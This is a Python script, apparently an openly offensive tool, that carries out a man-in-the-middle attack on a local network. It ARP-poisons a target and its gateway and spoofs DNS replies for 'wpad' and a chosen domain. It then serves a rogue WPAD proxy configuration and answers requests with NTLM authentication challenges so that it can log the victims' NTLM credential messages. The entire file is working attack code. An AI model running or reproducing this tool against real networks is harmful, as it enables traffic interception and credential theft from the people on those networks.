import argparse
import threading
import time
from scapy.all import ARP, Ether, srp, send, sniff, conf, get_if_addr, get_if_hwaddr, DNS, DNSQR, IP, UDP, DNSRR
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from colorama import init, Fore, Style

# Initialize colorama
init()

# Function to get the MAC address of the target IP
def get_mac(ip, iface):
    print(f"{Fore.YELLOW}[INFO] Getting MAC address for IP: {ip} on interface {iface}{Style.RESET_ALL}")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    for sent, received in ans:
        print(f"{Fore.GREEN}[INFO] MAC address for IP {ip} is {received.hwsrc}{Style.RESET_ALL}")
        return received.hwsrc
    print(f"{Fore.RED}[ERROR] Could not find MAC address for IP: {ip}{Style.RESET_ALL}")
    return None


# Function to get the gateway IP address
def get_gateway_ip():
    gateway_ip = conf.route.route("0.0.0.0")[2]
    print(f"{Fore.YELLOW}[INFO] Gateway IP address is: {gateway_ip}{Style.RESET_ALL}")
    return gateway_ip


# Function to get the local IP address of the attacker machine
def get_local_ip(iface):
    local_ip = get_if_addr(iface)
    print(f"{Fore.YELLOW}[INFO] Local IP address of attacker machine is: {local_ip}{Style.RESET_ALL}")
    return local_ip


# Function to get the local MAC address of the attacker machine
def get_local_mac(iface):
    local_mac = get_if_hwaddr(iface)
    print(f"{Fore.YELLOW}[INFO] Local MAC address of attacker machine is: {local_mac}{Style.RESET_ALL}")
    return local_mac


# ARP Poisoning
def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    print(f"{Fore.YELLOW}[INFO] Starting ARP poisoning: Target IP {target_ip}, Target MAC {target_mac}, Gateway IP {gateway_ip}, Gateway MAC {gateway_mac} on interface {iface}{Style.RESET_ALL}")
    while True:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=iface, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=iface, verbose=False)
        print(f"{Fore.GREEN}[INFO] ARP poison packets sent{Style.RESET_ALL}")
        time.sleep(2)


# DNS Spoofing
def dns_spoof(pkt, attacker_ip, domain):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # DNS query
        qname = pkt.getlayer(DNS).qd.qname.decode().strip('.')
        if qname == 'wpad' or (domain and qname.endswith(domain)):
            print(f"{Fore.YELLOW}[INFO] Spoofing DNS request for {qname}{Style.RESET_ALL}")
            spoofed_pkt = (IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                           UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                               an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=attacker_ip)))
            send(spoofed_pkt, iface=pkt.sniffed_on, verbose=False)
            print(f"{Fore.GREEN}[INFO] Spoofed DNS response sent for {qname}{Style.RESET_ALL}")


def start_dns_spoof(attacker_ip, domain, iface):
    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, attacker_ip, domain), iface=iface, store=0)


# WPAD Exploitation
class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, attacker_ip=None, proxy_port=None, **kwargs):
        self.attacker_ip = attacker_ip
        self.proxy_port = proxy_port
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path == "/wpad.dat":
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-ns-proxy-autoconfig')
            self.end_headers()
            wpad_data = f"""function FindProxyForURL(url, host) {{
                if ((host == "localhost") || shExpMatch(host, "localhost.*") ||
                    (host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT";
                return "PROXY {self.attacker_ip}:{self.proxy_port}; DIRECT";
            }}"""
            self.wfile.write(wpad_data.encode())
            print(f"{Fore.GREEN}[INFO] Served WPAD file{Style.RESET_ALL}")
        else:
            self.send_response(407)
            self.send_header('Server', 'Microsoft-IIS/10.0')
            self.send_header('Date', self.date_time_string())
            self.send_header('Content-Type', 'text/html')
            self.send_header('Proxy-Authenticate', 'NTLM')
            self.send_header('Proxy-Connection', 'close')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Content-Length', '0')
            self.end_headers()
            print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")

    def do_CONNECT(self):
        self.send_response(407)
        self.send_header('Server', 'Microsoft-IIS/10.0')
        self.send_header('Date', self.date_time_string())
        self.send_header('Content-Type', 'text/html')
        self.send_header('Proxy-Authenticate', 'NTLM')
        self.send_header('Proxy-Connection', 'close')
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")

    def do_POST(self):
        self.send_response(407)
        self.send_header('Server', 'Microsoft-IIS/10.0')
        self.send_header('Date', self.date_time_string())
        self.send_header('Content-Type', 'text/html')
        self.send_header('Proxy-Authenticate', 'NTLM')
        self.send_header('Proxy-Connection', 'close')
        self.send_header('Cache-Control', 'no-cache')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print(f"{Fore.YELLOW}[INFO] Responded with HTTP 407 Proxy Authentication Required{Style.RESET_ALL}")

    def log_message(self, format, *args):
        if "Proxy-Authorization" in self.headers:
            auth_header = self.headers.get("Proxy-Authorization", "")
            if "NTLM" in auth_header:
                print(f"{Fore.YELLOW}[INFO] NTLM Authentication Detected{Style.RESET_ALL}")
                try:
                    ntlm_message = base64.b64decode(auth_header.split()[1])
                    print(f"{Fore.CYAN}[INFO] NTLM Message: {ntlm_message.hex()}{Style.RESET_ALL}")
                except (IndexError, base64.binascii.Error) as e:
                    print(f"{Fore.RED}[ERROR] Failed to decode NTLM message: {e}{Style.RESET_ALL}")

def start_proxy_server(port, attacker_ip, proxy_port):
    def handler(*args, **kwargs):
        ProxyHTTPRequestHandler(*args, attacker_ip=attacker_ip, proxy_port=proxy_port, **kwargs)

    server_address = ('', port)
    httpd = HTTPServer(server_address, handler)
    print(f"{Fore.YELLOW}[INFO] Starting proxy server on port {port}{Style.RESET_ALL}")
    httpd.serve_forever()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="ARP/DNS Poisoning and WPAD Exploitation Script")
    parser.add_argument('-i', '--interface', required=True, help="Network interface to use")
    parser.add_argument('--target-ip', required=True, help="Target IP address")
    parser.add_argument('--target-mac', help="Target MAC address")
    parser.add_argument('--gateway-ip', help="Gateway IP address")
    parser.add_argument('--gateway-mac', help="Gateway MAC address")
    parser.add_argument('--attacker-ip', help="Attacker's IP address")
    parser.add_argument('--proxy-port', type=int, help="Port for the proxy server")
    parser.add_argument('--domain', help="Domain to spoof (e.g., domain.local)")
    args = parser.parse_args()

    conf.iface = args.interface

    if not args.target_mac:
        args.target_mac = get_mac(args.target_ip, args.interface)
        if not args.target_mac:
            print(f"{Fore.RED}[ERROR] Could not find target MAC address. Exiting.{Style.RESET_ALL}")
            exit(1)

    if not args.gateway_ip:
        args.gateway_ip = get_gateway_ip()
        if not args.gateway_ip:
            print(f"{Fore.RED}[ERROR] Could not find gateway IP address. Exiting.{Style.RESET_ALL}")
            exit(1)

    if not args.gateway_mac:
        args.gateway_mac = get_mac(args.gateway_ip, args.interface)
        if not args.gateway_mac:
            print(f"{Fore.RED}[ERROR] Could not find gateway MAC address. Exiting.{Style.RESET_ALL}")
            exit(1)

    if not args.attacker_ip:
        args.attacker_ip = get_local_ip(args.interface)
        if not args.attacker_ip:
            print(f"{Fore.RED}[ERROR] Could not find local IP address. Exiting.{Style.RESET_ALL}")
            exit(1)

    print(f'{Fore.CYAN}Target IP: {args.target_ip}{Style.RESET_ALL}')
    print(f'{Fore.CYAN}Target MAC: {args.target_mac}{Style.RESET_ALL}')
    print(f'{Fore.CYAN}Gateway IP: {args.gateway_ip}{Style.RESET_ALL}')
    print(f'{Fore.CYAN}Gateway MAC: {args.gateway_mac}{Style.RESET_ALL}')
    print(f'{Fore.CYAN}Attacker IP: {args.attacker_ip}{Style.RESET_ALL}')

    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=arp_poison, args=(args.target_ip, args.target_mac, args.gateway_ip, args.gateway_mac, args.interface))
    arp_thread.start()

    # Start DNS spoofing in a separate thread
    dns_thread = threading.Thread(target=start_dns_spoof, args=(args.attacker_ip, args.domain, args.interface))
    dns_thread.start()

    # Start the WPAD proxy server if proxy port is specified
    if args.proxy_port:
        start_proxy_server(args.proxy_port, args.attacker_ip, args.proxy_port)